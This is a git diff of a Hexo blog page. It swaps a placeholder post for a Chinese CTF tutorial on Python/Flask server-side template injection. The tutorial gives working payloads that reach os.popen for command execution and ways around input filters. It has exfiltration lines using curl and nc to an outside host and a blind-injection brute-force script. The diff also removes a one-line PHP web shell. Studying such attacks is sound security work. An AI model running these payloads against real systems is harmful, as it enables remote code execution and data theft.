@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="I love PHP, Security Studying">
+    <meta name="keywords" content="Python SSTI, Security Studying">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>I love PHP | Security Studying</title>
+    <title>Python SSTI | Security Studying</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">I love PHP</h1>
+                    <h1 class="description center-align post-title">Python SSTI</h1>
                 </div>
             </div>
         </div>
@@ -450,7 +450,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-27
+                    2020-05-29
                 </div>
                 
 
@@ -466,9 +466,151 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>test</p>
-<p>test121323123</p>
-<p><strong>***</strong>&amp;&amp;&amp;&amp;&amp;&amp;!@@@@@3231312</p>
+                <h2 id="Python模板注入-SSTI学习"><a href="#Python模板注入-SSTI学习" class="headerlink" title="Python模板注入 SSTI学习"></a>Python模板注入 SSTI学习</h2><h3 id="0x01-SSTI是什么？"><a href="#0x01-SSTI是什么？" class="headerlink" title="0x01:SSTI是什么？"></a>0x01:SSTI是什么？</h3><p>​            首先，针对一些就算没有学过Python的朋友，SSTI还是很友好的。</p>
+<p>​            SSTI（Server-Side Template Injection）服务器端模板注入，也有人称它为python沙盒绕过；举个不恰当的例子，高中的时候抄作业，要抄的答案就可以当作是一个模板，而此时你抄的内容就是模板的内容，每个人的写入题目的模板可以不同，但是答案（模板）是多变的，你可以拿各种别人写好的模板填在你的题目里；但是，在不当使用模板进行渲染时，就会产生模板注入。</p>
+<h3 id="0x02-为什么会产生SSTI？"><a href="#0x02-为什么会产生SSTI？" class="headerlink" title="0x02:为什么会产生SSTI？"></a>0x02:为什么会产生SSTI？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">"flag&#123;SSTI_123456&#125;"</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">'''</span> % (request.args.get(<span class="string">'404_url'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''' % (request.args.get('404_url'))</span></span><br><span class="line"><span class="string">    return render_template_string(template), 404</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，这里request.args.get (‘用户可控参数’)可以直接把回显传回页面中，并且利用不正确的渲染会产生SSTI，也就是说，SSTI产生的条件在于！！！flask中要存在用户可控的参数！！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string&#96;函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#96;&#123;&#123;&#125;&#125;&#96;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#96;&#123;&#123;&#125;&#125;&#96;包裹的内容当做变量解析替换。比如&#96;&#123;&#123;1+1&#125;&#125;&#96;会被解析成2</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="这里介绍ssti的基本模板利用方式"><a href="#这里介绍ssti的基本模板利用方式" class="headerlink" title="这里介绍ssti的基本模板利用方式"></a>这里介绍ssti的基本模板利用方式</h4><h5 id="基类-gt-子类-gt-子类使用的脚本-gt-调用危险函数"><a href="#基类-gt-子类-gt-子类使用的脚本-gt-调用危险函数" class="headerlink" title="(基类-&gt;子类-&gt;子类使用的脚本-&gt;调用危险函数)"></a>(基类-&gt;子类-&gt;子类使用的脚本-&gt;调用危险函数)</h5><p>​        针对基本类和实例的详细介绍，参考木头人：<a href="https://zhuanlan.zhihu.com/p/30024792" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30024792</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__:  用来返回所属类:   &quot;&quot;.__class__返回str&#x2F;&#x2F;[].__class__返回int</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__base__:   以元组的形式返回类所继承的类</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__mro__:   返回解析调用的顺序，具体顺序由来参考 https:&#x2F;&#x2F;hanjianwei.com&#x2F;2013&#x2F;07&#x2F;25&#x2F;python-mro&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__():   获取类的所有子类</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__:   因为所有自带类都包含init方法，可以藉此调用__globals__获取init所处空间下可使用的module,方法和变量</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<h3 id="0x03-怎么利用SSTI？"><a href="#0x03-怎么利用SSTI？" class="headerlink" title="0x03:怎么利用SSTI？"></a>0x03:怎么利用SSTI？</h3><h4 id="下面在CTF的实例中实战利用SSTI："><a href="#下面在CTF的实例中实战利用SSTI：" class="headerlink" title="下面在CTF的实例中实战利用SSTI："></a>下面在CTF的实例中实战利用SSTI：</h4><p>​        在URL中利用测试参数是否可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip:port&#x2F;&#123;&#123;x+y&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        测试2</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194615730.png" alt="image-20200507194615730"></p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194623344.png" alt="image-20200507194623344"></p>
+<p>​        测试49</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194644948.png" alt="image-20200507194644948"></p>
+<p>​        可见在回显中出现上述计算的结果，说明该位置的参数是用户可控的，使用config尝试读取配置信息</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195006930.png" alt="image-20200507195006930"></p>
+<p>成功得到了config的变量信息</p>
+<p>​        到这里，就基本判断存在此处存在SSTI，下面开始注入。</p>
+<hr>
+<p>​        首先，获取Object基类(要获取到object再操作)：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195323949.png" alt="image-20200507195323949"></p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195239753.png" alt="image-20200507195239753"></p>
+<p>​        获取所有的子类：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195421450.png" alt="image-20200507195421450"></p>
+<p>​        找不到可以直接利用的OS或者FILE文件，使用init.globals看看subclasses()中某个类有没有使用OS等模块可以利用</p>
+<p>​        以subclasses()[300]为例：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195725447.png" alt="image-20200507195725447"></p>
+<p>​        利用burp对[$***$]爆破,范围1-999：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195843543.png" alt="image-20200507195843543"></p>
+<p>​        找到一个可以利用os.py的项：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195941501.png" alt="image-20200507195941501"></p>
+<p>​        直接利用os.py尝试使用shell：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200225064.png" alt="image-20200507200225064"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ip:port/&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.globals__[<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        解释一下，意思就是调用<strong>subclass</strong>()[329]这一项中利用的os模块，使用os模块中的popen函数，开启进程使用shell，以读的方式得到whoami的值，可以看到得到了root用户。</p>
+<p>​        继续利用shell查看当前目录ls，发现了flog字样：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200305940.png" alt="image-20200507200305940"></p>
+<p>​        查看flog文件cat flog，得到flag：</p>
+<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200426437.png" alt="image-20200507200426437"></p>
+<h4 id="被WAF了怎么绕过？"><a href="#被WAF了怎么绕过？" class="headerlink" title="被WAF了怎么绕过？"></a>被WAF了怎么绕过？</h4><h5 id="引号过滤："><a href="#引号过滤：" class="headerlink" title="引号过滤："></a>引号过滤：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ip:port/&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.globals__[<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        由于python3中如果不是原生字符就默认不区分单双引号，这里就不强调引号的写法了。在这个payload中，<strong>class</strong> 前的’’可以使用[]代替，下面就是os和popen的引号如何替换</p>
+<p>​        request.args是flask中一个存储着请求参数以及其值的字典，可以这样利用它替换’’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'os'</span>][<span class="string">'popen'</span>] = [request.args.arg1]&#125;&#125;&amp;arg1=os[request.args.arg2]&#125;&#125;&amp;arg2=popen</span><br></pre></td></tr></table></figure>
+
+<p>​        <strong>另一种方法</strong>就是利用python自带函数chr()绕过：</p>
+<p>​        获取chr()需要FUZZ，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[§<span class="number">0</span>§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        得到了某个含chr的类索引，如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用chr()绕过所有刚刚出限引号的部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.__globals__[chr(<span class="number">111</span>)oschr(<span class="number">115</span>)][chr(<span class="number">112</span>)popenchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">108</span>)whoamichr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<h5 id="中括号过滤："><a href="#中括号过滤：" class="headerlink" title="中括号过滤："></a>中括号过滤：</h5><p>​        中括号过滤影响最大的还是前面的数组，而从数组中取值可以用pop/getitem等数组自带方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&#39;os&#39;] &#x3D; __globals__.os   直接替换</span><br></pre></td></tr></table></figure>
+
+<p>​        <em>pop</em>()方法从数组中删除最后一个元素，并返回该元素的值。此方法更改数组的长度 -Mozilla,所以还是尽可能用getitem获取数组值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem(<span class="number">329</span>).__init__.__globals__[<span class="string">"os"</span>][<span class="string">"popen"</span>](<span class="string">"whoami"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对比原来的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.globals__[<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="大括号过滤："><a href="#大括号过滤：" class="headerlink" title="大括号过滤："></a>大括号过滤：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">329</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://xx.xxx.xx.xx:8080/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        把结果外带到另外的主机8080端口上</p>
+<h5 id="点号过滤："><a href="#点号过滤：" class="headerlink" title="点号过滤："></a>点号过滤：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__ = <span class="string">""</span>[<span class="string">"__class__"</span>]</span><br></pre></td></tr></table></figure>
+
+<h5 id="关键词过滤："><a href="#关键词过滤：" class="headerlink" title="关键词过滤："></a>关键词过滤：</h5><p>​        一、如果关键词被替换成空，就可以先尝试双写绕过，不行就尝试字符串合并绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.使用中括号  __class__ &#x3D; [&quot;__clas&quot;+&quot;ss__&quot;]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.不使用中括号  __class__ &#x3D; __getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)    使用了getattribute来获取字典中的value</span><br></pre></td></tr></table></figure>
+
+<p>​        二、使用request对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__ &#x3D; &#123;&quot;&quot;.__getattribute__(request.args.a)&#125;&#125;&amp;a&#x3D;__class__</span><br></pre></td></tr></table></figure>
+
+<p>​        三、使用str原生函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mod__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmod__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_formatter_field_name_split&#39;, &#39;_formatter_parser&#39;, &#39;capitalize&#39;, &#39;center&#39;, &#39;count&#39;, &#39;decode&#39;, &#39;encode&#39;, &#39;endswith&#39;, &#39;expandtabs&#39;, &#39;find&#39;, &#39;format&#39;, &#39;index&#39;, &#39;isalnum&#39;, &#39;isalpha&#39;, &#39;isdigit&#39;, &#39;islower&#39;, &#39;isspace&#39;, &#39;istitle&#39;, &#39;isupper&#39;, &#39;join&#39;, &#39;ljust&#39;, &#39;lower&#39;, &#39;lstrip&#39;, &#39;partition&#39;, &#39;replace&#39;, &#39;rfind&#39;, &#39;rindex&#39;, &#39;rjust&#39;, &#39;rpartition&#39;, &#39;rsplit&#39;, &#39;rstrip&#39;, &#39;split&#39;, &#39;splitlines&#39;, &#39;startswith&#39;, &#39;strip&#39;, &#39;swapcase&#39;, &#39;title&#39;, &#39;translate&#39;, &#39;upper&#39;, &#39;zfill&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>​        四、使用decode、replace绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;SGFja2Vk&quot;.replace(&quot;S&quot;,&quot;&quot;)&#125;&#125;     将SGFja2Vk中的&#39;S&#39;替换成空    &#x2F;&#x2F;GFja2Vk</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;SGFja2Vk&quot;.decode(&quot;base64&quot;)&#125;&#125;    将SGFja2Vk进行base64解码     &#x2F;&#x2F;Hacked</span><br></pre></td></tr></table></figure>
+
+<h5 id="阉割模块："><a href="#阉割模块：" class="headerlink" title="阉割模块："></a>阉割模块：</h5><p>​        遇到内置的函数被阉割，使用reload重载。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from imp import reload</span><br><span class="line">reload(os).popen(&quot;whoami&quot;).read()</span><br></pre></td></tr></table></figure>
+
+<p>​        如果os也被阉割，可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)  重新载入builtins,之后就可以重新使用eval,import...</span><br></pre></td></tr></table></figure>
+
+<h6 id="与os类似的模块"><a href="#与os类似的模块" class="headerlink" title="与os类似的模块"></a>与os类似的模块</h6><p>​        subprocess:<strong>启动一个新的进程并与之通信</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(“command”)   </span><br><span class="line">subprocess.Popen(“command”)</span><br></pre></td></tr></table></figure>
+
+<h5 id="无回显处理："><a href="#无回显处理：" class="headerlink" title="无回显处理："></a>无回显处理：</h5><ul>
+<li><pre><code>nc转发
+- vps：`nc -lvp 3389`
+- payload: `&apos;&apos;.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__[&apos;os&apos;].system(&apos;ls | nc xx.xxx.xx.xx 3389&apos;)`
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反弹交互型shell：https:&#x2F;&#x2F;github.com&#x2F;0xR0&#x2F;shellver%EF%BC%89</span><br><span class="line"></span><br><span class="line">dnslog转发：https:&#x2F;&#x2F;github.com&#x2F;0xR0&#x2F;shellver%EF%BC%89</span><br><span class="line"></span><br><span class="line">无回显代码执行利用方法:</span><br></pre></td></tr></table></figure>
+盲注{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}类似SQL布尔注入，通过是否回显~p0~来判断注入是否成功
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  import requests
+  
+  url = 'http://127.0.0.1:8080/'
+  
+  def check(payload):
+      postdata = {
+          'exploit':payload
+          }
+      r = requests.post(url, data=postdata).content
+      return '~p0~' in r
+  
+  password  = ''
+  s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$'()*+,-./:;<=>?@[\]^`{|}~'"_%'
+  
+  for i in xrange(0,100):
+      for c in s:
+          payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}&apos;
+        if check(payload):
+            password += c
+            break
+    print password
+</code></pre></li>
+</ul>
+<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04:参考"></a>0x04:参考</h3><p>​    <a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172</a></p>
+<p>​    <a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener">https://xz.aliyun.com/t/6885</a></p>
 
             </div>
             <hr/>
@@ -494,7 +636,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Leeasina.github.io/2020/05/27/I-love-PHP/">http://Leeasina.github.io/2020/05/27/I-love-PHP/</a>
+                    <a href="http://Leeasina.github.io/2020/05/29/Python-SSTI/">http://Leeasina.github.io/2020/05/29/Python-SSTI/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -702,27 +844,25 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2020/05/27/I-love-PHP/">
+                <a href="/2020/05/29/Python-SSTI/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="I love PHP">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Python SSTI">
                         
-                        <span class="card-title">I love PHP</span>
+                        <span class="card-title">Python SSTI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            test
-test121323123
-***&amp;&amp;&amp;&amp;&amp;&amp;!@@@@@3231312
-
+                            Python模板注入 SSTI学习0x01:SSTI是什么？​            首先，针对一些就算没有学过Python的朋友，SSTI还是很友好的。
+​            SSTI（Server-Side Template Inj
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
                             </span>
                         <span class="publish-author">
                             
@@ -743,25 +883,19 @@ test121323123
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/27/article-title/">
+                <a href="/2020/05/27/hello-world/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="article title">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
                         
-                        <span class="card-title">article title</span>
+                        <span class="card-title">Hello World</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ##Test##test
-链接
-1&lt;?php @eval($_POST['cmd']);?&gt;
-
-
-
-
+                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
                         
                     </div>
                     <div class="publish-info">
